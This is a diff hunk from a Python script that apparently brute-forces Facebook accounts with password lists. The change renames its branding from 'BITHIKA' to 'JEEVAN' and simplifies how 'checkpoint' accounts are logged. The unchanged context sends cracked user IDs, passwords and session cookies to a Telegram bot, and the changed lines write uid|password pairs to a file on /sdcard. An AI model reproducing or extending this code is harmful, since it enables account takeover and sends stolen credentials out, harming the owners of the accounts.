@@ -995,10 +995,10 @@ def rndm1(uid,passlist):
                                         statusok = (f" {cid} | {pas} | {coki} ")
                                         requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                                         return True
-                        elif 'error' in po and 'message' in po['error'] and 'www.facebook.com' in po['error']['message'] and (uid_extracted := re.search(r'uid=(\d+)', po['error']['message'])).group(1) if uid_extracted else None:
+                        elif 'www.facebook.com' in po['error']['message']:
                                         if 'y' in pcp:
-                                                print(f'\r\r{G}[{Y}BITHIKA-CP{G}]{Y} '+uid_extracted+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/BITHIKA-CP.txt','a').write(uid_extracted+'|'+pas+'\n')
+                                                print(f'\r\r{G}[{Y}JEEVAN-CP{G}]{Y} '+uid+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/JEEVAN-CP.txt','a').write(uid+'|'+pas+'\n')
                                                 cps.append(uid)
                                                 return True
                                         else:
